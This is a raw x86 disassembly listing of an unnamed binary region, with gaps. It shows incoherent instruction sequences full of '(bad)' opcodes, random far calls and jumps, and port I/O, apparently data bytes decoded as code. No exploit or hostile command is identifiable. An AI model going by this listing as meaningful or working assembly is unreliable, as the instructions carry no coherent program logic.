  42f2ae:	push   eax
  42f2af:	mov    ah,0xb
  42f2b1:	pop    ebp
  42f2b2:	and    cl,BYTE PTR [ecx+0x66ad2b37]
  42f2b8:	imul   ebx,ebx,0x1e
  42f2bb:	ret    
  42f2bc:	mov    ecx,0x84fa1a9e
  42f2c1:	mov    dl,0x47
  42f2c3:	sub    eax,0x660954f5
  42f2c8:	xchg   esi,eax
  42f2c9:	fild   QWORD PTR [ebx+0x57a4d9c]
  42f2cf:	cmp    eax,0xa5febb17
  42f2d4:	push   esp
  42f2d5:	or     dh,0x8c
  42f2d8:	xchg   edi,eax
  42f2d9:	cwde   
  42f2da:	fmul   QWORD PTR [eax+0x13e40ceb]
  42f2e0:	jmp    0x42f33d
  42f2e2:	sub    DWORD PTR [ebp+0x25],edi
  42f2e5:	xor    esp,DWORD PTR [eax+0x34cfaf5e]
  42f2eb:	stos   DWORD PTR es:[edi],eax
  42f2ec:	lods   eax,DWORD PTR ds:[esi]
  42f2ed:	xor    eax,0x53155e89
  42f2f2:	mov    ebx,0xecec19b
  42f2f7:	mov    ecx,DWORD PTR [eax-0x35575b22]
  42f2fd:	cmp    edi,ecx
  42f2ff:	inc    ecx
  42f300:	ins    BYTE PTR es:[edi],dx
  42f301:	ret    
  42f302:	mov    ch,0xb1
  42f304:	add    BYTE PTR [eax],ch
  42f306:	dec    edx
  42f307:	or     BYTE PTR [edx],0xa2
  42f30a:	jo     0x42f2f6
  42f30c:	inc    esi
  42f30d:	adc    BYTE PTR [ebx+0xe7dc],ah
	...
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	or     DWORD PTR [edi+edi*8-0x4b],ecx
  42f384:	mov    edi,edx
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0xdf000001
  42f38d:	push   ds
  42f38e:	pop    ss
  42f38f:	inc    esi
  42f390:	xchg   BYTE PTR [edx+0x74],bh
  42f393:	mov    bl,0x85
  42f395:	pop    es
  42f396:	push   edi
  42f397:	adc    eax,0x7449e7ca
  42f39c:	jb     0x42f329
  42f39e:	cmp    al,0xdf
  42f3a0:	and    BYTE PTR [ebx+0x4d],bl
  42f3a3:	daa    
  42f3a4:	sbb    ecx,DWORD PTR [edx-0x9]
  42f3a7:	stc    
  42f3a8:	jp     0x42f336
  42f3aa:	in     al,0x81
  42f3ac:	std    
  42f3ad:	dec    ebx
  42f3ae:	int3   
  42f3af:	std    
  42f3b0:	mov    esi,0x8f0bd3d0
  42f3b5:	inc    esi
  42f3b6:	pusha  
  42f3b7:	xchg   edx,eax
  42f3b8:	ror    dl,1
  42f3ba:	pop    edi
  42f3bb:	retf   
  42f3bc:	int    0x27
  42f3be:	cmp    DWORD PTR [ebx-0x7e],esi
  42f3c1:	(bad)  
  42f3c2:	xor    bl,dh
  42f3c4:	mov    bl,0x12
  42f3c6:	repnz inc ecx
  42f3c8:	lds    eax,FWORD PTR ds:0x682d5820
  42f3ce:	lahf   
  42f3cf:	sbb    esp,ecx
  42f3d1:	dec    ebx
  42f3d2:	loopne 0x42f3ed
  42f3d4:	pop    edi
  42f3d5:	aad    0x6b
  42f3d7:	mov    ah,0x71
  42f3d9:	sub    ecx,DWORD PTR [edi+0x7ebeba91]
  42f3df:	pop    es
  42f3e0:	adc    eax,DWORD PTR [ecx]
  42f3e2:	call   0x15f4:0x89ca58ab
  42f3e9:	pop    ebx
  42f3ea:	(bad)  
  42f3eb:	out    0x10,al
  42f3ed:	xor    dl,BYTE PTR [edx]
  42f3ef:	cmp    dh,BYTE PTR [ebx]
  42f3f1:	jl     0x42f420
  42f3f3:	ror    BYTE PTR [ecx-0x6d],0x1a
  42f3f7:	push   ecx
  42f3f8:	adc    bl,BYTE PTR [ebx+ebp*4]
  42f3fb:	add    esp,edi
  42f3fd:	mov    BYTE PTR [esi-0x121355ad],dh
  42f403:	ds nop
  42f405:	pop    edx
  42f406:	les    ecx,FWORD PTR [edi-0xa]
  42f409:	inc    edi
  42f40a:	mov    ecx,0x6f782887
  42f40f:	outs   dx,BYTE PTR ds:[esi]
  42f410:	enter  0x43f6,0x78
  42f414:	call   edi
  42f416:	ins    BYTE PTR es:[edi],dx
  42f417:	(bad)  
  42f418:	or     BYTE PTR [edi+esi*8+0x453417c1],dl
  42f41f:	xchg   DWORD PTR ds:0x3df69e44,esp
  42f425:	xor    edx,DWORD PTR [edx+0x34]
  42f428:	scas   eax,DWORD PTR es:[edi]
  42f429:	icebp  
  42f42a:	lods   eax,DWORD PTR ds:[esi]
  42f42b:	sbb    BYTE PTR [edx+0x61],bl
  42f42e:	outs   dx,BYTE PTR ds:[esi]
  42f42f:	sbb    ch,BYTE PTR [ebx+0x22703fdf]
  42f435:	inc    esp
  42f436:	xor    DWORD PTR [ebp+0x25],eax
  42f439:	ret    0x1ab6
  42f43c:	sbb    edx,esi
  42f43e:	mov    ch,0xe5
  42f440:	sbb    DWORD PTR [ebx],eax
  42f442:	retf   
  42f443:	push   cs
  42f444:	xor    DWORD PTR [eax],edx
  42f446:	push   esp
  42f447:	nop
  42f448:	lods   eax,DWORD PTR ds:[esi]
  42f449:	mov    esp,0xdd04f37c
  42f44e:	outs   dx,BYTE PTR ds:[esi]
  42f44f:	cli    
  42f450:	(bad)  
  42f451:	in     eax,dx
  42f452:	rol    al,1
  42f454:	cmp    DWORD PTR [ecx+eiz*2+0xcad6196],esp
  42f45b:	push   ebx
  42f45c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f45d:	stos   DWORD PTR es:[edi],eax
  42f45e:	jmp    0x42f481
  42f460:	xor    eax,DWORD PTR [edx+0x7c]
  42f463:	cmc    
  42f464:	inc    eax
  42f465:	mov    eax,ds:0x687393d7
  42f46a:	aad    0x4c
  42f46c:	xchg   ebp,eax
  42f46d:	ret    
  42f46e:	mov    eax,0x749e512e
  42f473:	and    eax,0x46a6749c
  42f478:	dec    edx
  42f479:	idiv   DWORD PTR [edi+0x24]
  42f47c:	pop    edx
  42f47d:	mov    ebx,0xd0aac5dd
  42f482:	jmp    0x74537a17
  42f487:	pop    esi
  42f488:	mov    edx,0x69e165df
  42f48d:	dec    edi
  42f48e:	push   ss
  42f48f:	push   ds
  42f490:	fild   WORD PTR [eax]
	...
  42f4f2:	add    BYTE PTR [eax],al
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	jnp    0x42f4ec
  42f502:	(bad)  
  42f503:	stc    
  42f504:	nop
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0x85000001
  42f50d:	std    
  42f50e:	outs   dx,DWORD PTR ds:[esi]
  42f50f:	scas   eax,DWORD PTR es:[edi]
  42f510:	in     al,0xab
  42f512:	mov    ah,0x93
  42f514:	mov    esi,0xd847e652
  42f519:	shl    BYTE PTR [eax+0x51968a36],cl
  42f51f:	test   eax,0x88e46fc1
  42f524:	out    0x24,eax
  42f526:	mov    al,0xf8
  42f528:	enter  0x464,0x6c
  42f52c:	or     ebp,DWORD PTR [edx]
  42f52e:	or     eax,DWORD PTR [eax]
  42f530:	mov    eax,0xb2cf9788
  42f535:	jp     0x42f4dc
  42f537:	sbb    al,0xfa
  42f539:	mov    ds:0x77fe0c5c,al
  42f53e:	mov    ebx,0x5b32f61c
  42f543:	mov    ebp,?
  42f545:	call   0x82cfd92c
  42f54a:	ja     0x42f5ac
  42f54c:	xchg   ebp,eax
  42f54d:	ins    DWORD PTR es:[edi],dx
  42f54e:	jnp    0x42f548
  42f550:	or     eax,0x42f773d4
  42f555:	outs   dx,DWORD PTR ds:[esi]
  42f556:	pop    ds
  42f557:	cs (bad) 
  42f559:	push   0xd4ab21bd
  42f55e:	xor    eax,0xbb9486e3
  42f563:	dec    ebx
  42f564:	xchg   ecx,eax
  42f565:	cld    
  42f566:	lock lods eax,DWORD PTR ds:[esi]
  42f568:	out    0x84,eax
  42f56a:	xchg   esi,eax
  42f56b:	aas    
  42f56c:	mov    edx,0x6a2319f7
  42f571:	push   cs
  42f572:	lock adc al,0x8c
  42f575:	pushf  
  42f576:	push   0xc16f1bc6
  42f57b:	sbb    BYTE PTR [esi-0x9],0x5
  42f57f:	xchg   esi,eax
  42f580:	dec    edi
  42f581:	sbb    DWORD PTR [edi+0x2],ebp
  42f584:	pop    esp
  42f585:	(bad)  
  42f587:	inc    ecx
  42f588:	call   0xbdda:0x9667260
  42f58f:	xchg   esi,eax
  42f590:	xor    esp,0x89fd4dd3
  42f596:	inc    eax
  42f597:	pop    ebp
  42f598:	in     eax,dx
  42f599:	mov    edx,0xbcc15994
  42f59e:	je     0x42f569
  42f5a0:	xchg   esp,eax
  42f5a1:	addr16 mov dh,0xf8
  42f5a4:	and    al,0x30
  42f5a6:	(bad)  
  42f5a7:	xchg   ebp,eax
  42f5a8:	es and eax,0x4c201888
  42f5ae:	les    ecx,FWORD PTR [esi+0x63]
  42f5b1:	inc    edx
  42f5b2:	pop    es
  42f5b3:	mov    ebp,esp
  42f5b5:	pop    ebx
  42f5b6:	pushf  
  42f5b7:	pushf  
  42f5b8:	jl     0x42f60f
  42f5ba:	mov    ds:0x4b2cee21,eax
  42f5bf:	mov    al,0x82
  42f5c1:	je     0x42f5a0
  42f5c3:	mov    ds:0x24daef56,eax
  42f5c8:	xor    DWORD PTR [esi+0x593f8a56],edi
  42f5ce:	rcr    BYTE PTR [ecx-0xf],0x94
  42f5d2:	out    dx,al
  42f5d3:	jo     0x42f5d4
  42f5d5:	xor    al,cl
  42f5d7:	inc    ebp
  42f5d8:	dec    edx
  42f5d9:	mov    ch,0x37
  42f5db:	fstp   QWORD PTR [edi+ebx*1]
  42f5de:	push   ds
  42f5df:	or     al,0x47
  42f5e1:	jl     0x42f652
  42f5e3:	cmp    al,0x21
  42f5e5:	lock aam 0x4e
  42f5e8:	sbb    eax,0x4609035b
  42f5ed:	js     0x42f57b
  42f5ef:	pusha  
  42f5f0:	neg    DWORD PTR [edx+esi*8]
  42f5f3:	or     BYTE PTR ds:0xc8d5c68a,0x38
  42f5fa:	je     0x42f5ac
  42f5fc:	bound  ebp,QWORD PTR [edi]
  42f5fe:	jb     0x42f5c1
  42f600:	push   es
  42f601:	repz xchg ecx,eax
  42f603:	test   BYTE PTR [ecx+0x577ba776],dl
  42f609:	xchg   DWORD PTR [eax],ebx
  42f60b:	mov    al,ds:0x75298c49
  42f610:	cli    
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	mov    edx,0x95b0a5e7
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0xd6000001
  42f68d:	xchg   esp,eax
  42f68e:	gs pop ds
  42f690:	lds    esi,FWORD PTR [ecx-0x6a]
  42f693:	cmp    BYTE PTR [eax+0xfc06ab8],ah
  42f699:	in     al,dx
  42f69a:	sbb    BYTE PTR ss:[eax],bl
  42f69d:	test   dl,ch
  42f69f:	jbe    0x42f6e9
  42f6a1:	xor    dh,BYTE PTR [eax-0x59]
  42f6a4:	sub    bl,BYTE PTR [edi]
  42f6a6:	mov    DWORD PTR [edi],ebx
  42f6a8:	or     al,0xeb
  42f6aa:	push   0xf86dc6a4
  42f6af:	cmp    esi,DWORD PTR [ebx-0x5d]
  42f6b2:	adc    DWORD PTR [esi-0x47],edx
  42f6b5:	push   ss
  42f6b6:	pushf  
  42f6b7:	mov    WORD PTR [edi+0x3921e96c],ss
  42f6bd:	push   ebp
  42f6be:	xor    BYTE PTR [eax],al
  42f6c0:	into   
  42f6c1:	cmp    eax,DWORD PTR ds:0xa87aeb06
  42f6c7:	test   BYTE PTR [edi],bh
  42f6c9:	lea    ebx,[ecx]
  42f6cb:	shl    DWORD PTR [ebp-0x72],cl
  42f6ce:	jb     0x42f748
  42f6d0:	pop    ebx
  42f6d1:	lahf   
  42f6d2:	or     al,0xe4
  42f6d4:	jl     0x42f68b
  42f6d6:	jg     0x42f69e
  42f6d8:	cli    
  42f6d9:	pop    esp
  42f6da:	dec    ecx
  42f6db:	xchg   ecx,eax
  42f6dc:	(bad)
  42f6e1:	test   esp,ecx
  42f6e3:	xor    BYTE PTR [edi+0x77],dh
  42f6e6:	adc    eax,0x3ce583d4
  42f6eb:	adc    eax,0xa29a2b92
  42f6f0:	xor    eax,esi
  42f6f2:	mov    bl,0xb
  42f6f4:	and    BYTE PTR [edx],bh
  42f6f6:	pop    edi
  42f6f7:	cmp    bh,cl
  42f6f9:	dec    edi
  42f6fa:	dec    BYTE PTR cs:[ebx+0x28dfac77]
  42f701:	sti    
  42f702:	cs jp  0x42f70c
  42f705:	int    0x96
  42f707:	inc    ecx
  42f708:	adc    eax,0x24ca14c3
  42f70d:	pop    edx
  42f70e:	cmp    DWORD PTR [edi],edx
  42f710:	and    eax,0xb55aad85
  42f715:	leave  
  42f716:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42f718:	mov    esp,0x49f68cc9
  42f71d:	adc    al,0x9
  42f71f:	cli    
  42f720:	imul   bl
  42f722:	xlat   BYTE PTR ds:[ebx]
  42f723:	jnp    0x42f6c8
  42f725:	and    DWORD PTR [edx],ecx
  42f727:	loopne 0x42f6b3
  42f729:	jmp    0xe3a3dc67
  42f72e:	test   BYTE PTR [ebp+0x76],bh
  42f731:	push   0xffffffd3
  42f733:	(bad)  
  42f734:	shl    dh,1
  42f736:	out    0x57,al
  42f738:	sub    DWORD PTR [ecx],0x3b7bdd8b
  42f73e:	xchg   edx,eax
  42f73f:	mov    cl,0x1d
  42f741:	ss test eax,0xf490677e
  42f747:	sbb    DWORD PTR [ebx+ebp*2-0x1b],edi
  42f74b:	adc    esi,DWORD PTR [eax]
  42f74d:	imul   ebp,DWORD PTR ds:0xd830a7fc,0x6d
  42f754:	jo     0x42f70e
  42f756:	pop    eax
  42f757:	ret    0xee85
  42f75a:	pop    es
  42f75b:	push   ebx
  42f75c:	scas   eax,DWORD PTR es:[edi]
  42f75d:	call   0x5e2e2b58
  42f762:	or     al,0xf
  42f764:	xchg   dh,ah
  42f766:	dec    eax
  42f767:	inc    eax
  42f768:	call   0xe046ef74
  42f76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f76e:	sti    
  42f76f:	call   0xea742b4e
  42f774:	fist   WORD PTR [ebx]
  42f776:	mov    WORD PTR [ecx+0x7b],es
  42f779:	cmp    ah,dl
  42f77b:	inc    BYTE PTR [eax-0xa]
  42f77e:	inc    ebx
  42f77f:	(bad)  
  42f780:	mov    ebx,0x84733f16
  42f785:	outs   dx,DWORD PTR ds:[esi]
  42f786:	jo     0x42f75c
  42f788:	dec    ebp
  42f789:	popa   
  42f78a:	fadd   DWORD PTR [ecx+0x6c4ddb8d]
  42f790:	fwait
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x9c85aece
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [edi-0x7c4370e1],bl
  42f811:	add    cl,ah
  42f813:	push   cs
  42f814:	ds out 0xc1,al
  42f817:	ret    0x91ce
  42f81a:	mov    dl,0x70
  42f81c:	sahf   
  42f81d:	sti    
  42f81e:	sub    cl,ah
  42f820:	mov    esi,0x64884781
  42f825:	cmp    bh,bh
  42f827:	jle    0x42f83f
  42f829:	add    bl,BYTE PTR [eax-0x3b2dc193]
  42f82f:	adc    eax,0x49117cfe
  42f834:	fidiv  WORD PTR ds:[edx-0x16]
  42f838:	cmp    al,0xd8
  42f83a:	stc    
  42f83b:	pushf  
  42f83c:	jae    0x42f873
  42f83e:	jne    0x42f7e0
  42f840:	mov    eax,ds:0xaa03dcb6
  42f845:	push   edx
  42f846:	mov    dl,0x86
  42f848:	add    al,0x66
  42f84a:	jp     0x42f8b0
  42f84c:	push   edi
  42f84d:	leave  
  42f84e:	icebp  
  42f84f:	outs   dx,BYTE PTR ds:[esi]
  42f850:	pop    eax
  42f851:	les    esp,FWORD PTR [edx-0x32]
  42f854:	sub    DWORD PTR [ebp-0x1c],esi
  42f857:	cmp    eax,0x1403ce6a
  42f85c:	dec    edi
  42f85d:	mov    ebp,0x1adce05f
  42f862:	ins    DWORD PTR es:[edi],dx
  42f863:	mov    ds:0x53fd22ce,al
  42f868:	inc    ebx
  42f869:	sti    
  42f86a:	leave  
  42f86b:	and    ah,BYTE PTR [esi+esi*1-0x12]
  42f86f:	sbb    eax,0x840f706b
  42f874:	sbb    eax,edi
  42f876:	fisubr WORD PTR [ebp+0x64]
  42f879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f87a:	mov    bl,0x48
  42f87c:	or     esp,DWORD PTR ds:0x36fc840b
  42f882:	pop    ecx
  42f883:	xor    eax,0x7dc33895
  42f888:	dec    ecx
  42f889:	pop    esi
  42f88a:	fistp  WORD PTR [ebp+0x14]
  42f88d:	xor    eax,0x18668255
  42f892:	mov    edi,0x1c358990
  42f897:	stos   DWORD PTR es:[edi],eax
  42f898:	loope  0x42f8e8
  42f89a:	xor    ebx,DWORD PTR [ebx+0x43]
  42f89d:	jg     0x42f902
  42f89f:	jae    0x42f87f
  42f8a1:	pop    ds
  42f8a2:	jae    0x42f863
  42f8a4:	inc    edx
  42f8a5:	adc    ah,0xb9
  42f8a8:	pop    eax
  42f8a9:	mov    esi,0x289b8ea4
  42f8ae:	jb     0x42f863
  42f8b0:	pop    ss
  42f8b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8b2:	aas    
  42f8b3:	neg    DWORD PTR fs:[esp+eax*8-0x40]
  42f8b8:	or     al,0x14
  42f8ba:	sar    DWORD PTR [esi-0x80],0xc4
  42f8be:	outs   dx,DWORD PTR ds:[esi]
  42f8bf:	or     al,0x72
  42f8c1:	xchg   edi,eax
  42f8c2:	bound  ecx,QWORD PTR [eax+eax*4+0x48]
  42f8c6:	adc    eax,0x668e81fa
  42f8cb:	es xchg edi,eax
  42f8cd:	or     ah,ah
  42f8cf:	aas    
  42f8d0:	add    eax,0x5dd9680c
  42f8d5:	in     eax,0x1b
  42f8d7:	add    eax,0xccad52be
  42f8dc:	jbe    0x42f8cf
  42f8de:	cs jge 0x42f955
  42f8e1:	leave  
  42f8e2:	pop    edx
  42f8e3:	sbb    esp,ebx
  42f8e5:	fs or  ecx,esi
  42f8e8:	jbe    0x42f898
  42f8ea:	sti    
  42f8eb:	out    dx,al
  42f8ec:	call   0xab55:0x882a92c6
  42f8f3:	inc    edi
  42f8f4:	cmp    BYTE PTR [esi],0x19
  42f8f7:	xor    edi,DWORD PTR [ebx+0x5c]
  42f8fa:	mov    dl,0xa3
  42f8fc:	ds mov ecx,edx
  42f8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f900:	call   0xd9006a89
  42f905:	dec    ebx
  42f906:	out    0x3d,eax
  42f908:	xchg   esi,eax
  42f909:	mov    ebx,0x999ffb6e
  42f90e:	gs cwde 
  42f910:	rol    DWORD PTR [eax],0x0
	...
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9e1
  42f981:	repz scas eax,DWORD PTR es:[edi]
  42f983:	arpl   WORD PTR [edi+0x50001fe],bx
  42f989:	add    DWORD PTR [eax],eax
  42f98b:	add    BYTE PTR [eax-0x29e45297],dl
  42f991:	shl    DWORD PTR [esi],0xcb
  42f994:	out    0xd9,al
  42f996:	ss mov dh,0xcf
  42f999:	repz leave 
  42f99b:	dec    esp
  42f99c:	sar    BYTE PTR [edx+0x5e2ff3d7],1
  42f9a2:	jnp    0x42f9c7
  42f9a4:	jg     0x42f9ed
  42f9a6:	inc    esp
  42f9a7:	(bad)  
  42f9a8:	hlt    
  42f9a9:	mov    eax,0xf2edc860
  42f9ae:	fst    QWORD PTR [edx-0x4e]
  42f9b1:	ret    
  42f9b2:	out    0x8c,eax
  42f9b4:	add    eax,0x6d4921e1
  42f9b9:	push   ds
  42f9ba:	sub    al,0x2f
  42f9bc:	mov    al,0x2a
  42f9be:	retf   
  42f9bf:	cld    
  42f9c0:	fwait
  42f9c1:	ret    
  42f9c2:	jae    0x42fa2d
  42f9c4:	(bad)  
  42f9c5:	in     eax,dx
  42f9c6:	pop    eax
  42f9c7:	(bad)  
  42f9c8:	push   ecx
  42f9c9:	push   ebx
  42f9ca:	inc    esp
  42f9cb:	xor    DWORD PTR [edi+0x3e39423c],esi
  42f9d1:	call   0xe682:0x43d6b11e
  42f9d8:	test   BYTE PTR [eax-0x6640cdc0],0xb9
  42f9df:	repnz push 0xffffff8a
  42f9e2:	cmp    DWORD PTR [ebx+0x275ef7d8],edx
  42f9e8:	stos   DWORD PTR es:[edi],eax
  42f9e9:	dec    esi
  42f9ea:	enter  0xadca,0x11
  42f9ee:	adc    DWORD PTR [edx],0x3
  42f9f1:	dec    esp
  42f9f2:	or     al,BYTE PTR [eax]
  42f9f4:	idiv   BYTE PTR [edi]
  42f9f6:	lahf   
  42f9f7:	and    eax,0x2bb73f20
  42f9fc:	gs inc edx
  42f9fe:	sub    eax,0xd5eee40a
  42fa03:	or     cl,dh
  42fa05:	fild   QWORD PTR [esi]
  42fa07:	ficomp DWORD PTR ds:0xc80d53c0
  42fa0d:	xor    dl,BYTE PTR [ebx+0x4]
  42fa10:	pop    esp
  42fa11:	pop    ds
  42fa12:	xlat   BYTE PTR ds:[ebx]
  42fa13:	xor    ch,bh
  42fa15:	inc    edi
  42fa16:	xor    BYTE PTR [eax+edx*1],ah
  42fa19:	dec    esp
  42fa1a:	jne    0x42fa63
  42fa1c:	icebp  
  42fa1d:	push   0xffffffec
  42fa1f:	push   ss
  42fa20:	push   edx
  42fa21:	es js  0x42fa07
  42fa24:	jno    0x42fa43
  42fa26:	mov    esp,DWORD PTR [edx+esi*1]
  42fa29:	add    edx,DWORD PTR [ebx]
  42fa2b:	jo     0x42f9b7
  42fa2d:	les    ebp,FWORD PTR [ebx-0x6b8ef7d1]
  42fa33:	xchg   esp,eax
  42fa34:	ins    DWORD PTR es:[edi],dx
  42fa35:	cmp    eax,0xd91e2e45
  42fa3a:	cwde   
  42fa3b:	mov    dh,0xd5
  42fa3d:	inc    eax
  42fa3e:	push   0x6dc937a
  42fa43:	imul   esi,DWORD PTR [ebp-0x2a],0xf0511e7f
  42fa4a:	adc    ecx,DWORD PTR [ebx-0x68b2cda]
  42fa50:	idiv   BYTE PTR [esi-0x6a61b92b]
  42fa56:	jmp    DWORD PTR [esp+eax*8]
  42fa59:	fwait
  42fa5a:	lds    ebx,FWORD PTR [ecx+0x45]
  42fa5d:	cmp    esp,ebp
  42fa5f:	dec    edx
  42fa60:	sub    esp,DWORD PTR [esi]
  42fa62:	inc    esi
  42fa63:	(bad)
  42fa67:	dec    esp
  42fa68:	xor    al,0x62
  42fa6a:	push   cs
  42fa6b:	daa    
  42fa6c:	ins    DWORD PTR es:[edi],dx
  42fa6d:	adc    ch,BYTE PTR [ecx+0x26]
  42fa70:	xchg   edi,eax
  42fa71:	sti    
  42fa72:	shl    DWORD PTR [ebx],cl
  42fa74:	mov    BYTE PTR [eax-0x45c315fd],ah
  42fa7a:	outs   dx,BYTE PTR ds:[esi]
  42fa7b:	outs   dx,BYTE PTR ds:[esi]
  42fa7c:	lock cmp al,0xfb
  42fa7f:	jnp    0x42fa2c
  42fa81:	add    edi,edx
  42fa83:	cld    
  42fa84:	clc    
  42fa85:	jnp    0x42fa9c
  42fa87:	in     al,0x8
  42fa89:	push   ss
  42fa8a:	into   
  42fa8b:	mov    bh,0x14
  42fa8d:	push   ss
  42fa8e:	shl    DWORD PTR [esp+esi*2],cl
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	lds    esp,FWORD PTR [esi+ecx*1]
  42fb03:	mov    dl,0xa4
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0xa7000001,al
  42fb0d:	mov    fs,ecx
  42fb0f:	out    dx,eax
  42fb10:	sub    eax,DWORD PTR [ecx-0x5]
  42fb13:	adc    BYTE PTR [edx],cl
  42fb15:	shl    DWORD PTR [esi],cl
  42fb17:	pushf  
  42fb18:	scas   eax,DWORD PTR es:[edi]
  42fb19:	sub    eax,0x7fc53c04
  42fb1e:	gs (bad) 
  42fb20:	adc    edx,esi
  42fb22:	xor    DWORD PTR [edi+0x694961fa],eax
  42fb28:	ret    
  42fb29:	loopne 0x42fb14
  42fb2b:	adc    al,ch
  42fb2d:	jmp    0x42fb92
  42fb2f:	mov    eax,0xe68da9ff
  42fb34:	or     ch,BYTE PTR [eax]
  42fb36:	sub    ebx,ebp
  42fb38:	fwait
  42fb39:	xchg   edx,eax
  42fb3a:	jnp    0x42fae8
  42fb3c:	adc    al,0x98
  42fb3e:	dec    edi
  42fb3f:	add    eax,0xad64a30e
  42fb44:	push   cs
  42fb45:	mov    edx,0xe5d77f6f
  42fb4a:	in     eax,dx
  42fb4b:	retf   
  42fb4c:	imul   edx,DWORD PTR ds:0xe0477805,0x37
  42fb53:	xor    DWORD PTR [edi],esp
  42fb55:	fisttp WORD PTR [eax-0x79]
  42fb58:	add    bh,BYTE PTR [ebx]
  42fb5a:	scas   eax,DWORD PTR es:[edi]
  42fb5b:	inc    ebp
  42fb5c:	xchg   edx,eax
  42fb5d:	ror    BYTE PTR [eax-0x11],0xcc
  42fb61:	xlat   BYTE PTR ds:[ebx]
  42fb62:	cmc    
  42fb63:	iret   
  42fb64:	int3   
  42fb65:	or     esi,DWORD PTR [edx+0x39]
  42fb68:	mov    eax,0xbb07f940
  42fb6d:	(bad)  
  42fb6e:	lea    esp,[ebx+0xcb2faa1]
  42fb74:	pop    ss
  42fb75:	shl    DWORD PTR [edx-0x3390b7bb],0x6f
  42fb7c:	jle    0x42fbaa
  42fb7e:	lods   eax,DWORD PTR ds:[esi]
  42fb7f:	sub    dl,bh
  42fb81:	lods   al,BYTE PTR ds:[esi]
  42fb82:	cmp    dh,dl
  42fb84:	outs   dx,BYTE PTR ds:[esi]
  42fb85:	mov    ds:0x88f7ed70,al
  42fb8a:	leave  
  42fb8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb8c:	jmp    0xd5b22cd2
  42fb91:	lea    ebx,[ebx-0x161d4d39]
  42fb97:	sub    dh,BYTE PTR [ebx]
  42fb99:	xor    al,0x31
  42fb9b:	cmp    DWORD PTR [ecx+0x9],ebp
  42fb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb9f:	sub    eax,0x14aed696
  42fba4:	loope  0x42fb34
  42fba6:	rcl    edi,cl
  42fba8:	in     al,dx
  42fba9:	adc    BYTE PTR [edi+0x6495cecb],bl
  42fbaf:	pop    ss
  42fbb0:	add    DWORD PTR [ebx],esi
  42fbb2:	das    
  42fbb3:	and    al,0x5a
  42fbb5:	adc    al,0x6c
  42fbb7:	jmp    0xe3b6:0x6d14faae
  42fbbe:	add    eax,0x22315e4d
  42fbc3:	mov    al,0xe4
  42fbc5:	pop    ecx
  42fbc6:	mov    esi,0xf3039adf
  42fbcb:	in     eax,0xe
  42fbcd:	xor    al,0x48
  42fbcf:	sbb    BYTE PTR [esi-0x43be4ccf],bh
  42fbd5:	sbb    al,0xc5
  42fbd7:	(bad)  
  42fbd8:	jno    0x42fc2e
  42fbda:	sub    al,0x11
  42fbdc:	push   edx
  42fbdd:	scas   al,BYTE PTR es:[edi]
  42fbde:	mov    DWORD PTR [eax],edi
  42fbe0:	jo     0x42fc4d
  42fbe2:	aam    0x57
  42fbe4:	mov    ecx,0x34b0c416
  42fbe9:	out    dx,al
  42fbea:	cld    
  42fbeb:	pop    ds
  42fbec:	inc    edx
  42fbed:	jmp    0x42fbc2
  42fbef:	pop    esp
  42fbf0:	arpl   bx,bx
  42fbf2:	add    esi,DWORD PTR [ecx-0x24]
  42fbf5:	fidiv  WORD PTR [ebx]
  42fbf7:	ss mov esp,0x85a49e95
  42fbfd:	imul   ebx,DWORD PTR [edi-0x6f],0x13
  42fc01:	adc    esi,DWORD PTR [edx]
  42fc03:	imul   ebx,ebx,0xc6598869
  42fc09:	imul   dl
  42fc0b:	push   ebp
  42fc0c:	jl     0x42fc40
  42fc0e:	fstp   QWORD PTR [edx-0x76]
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x2058:0x2036325e
  42fc82:	xchg   BYTE PTR [edi],al
  42fc84:	test   eax,0x5000200
  42fc89:	add    DWORD PTR [eax],eax
  42fc8b:	add    BYTE PTR [edx+0x45bac2e2],bh
  42fc91:	adc    dl,BYTE PTR ds:0xd7a9fafb
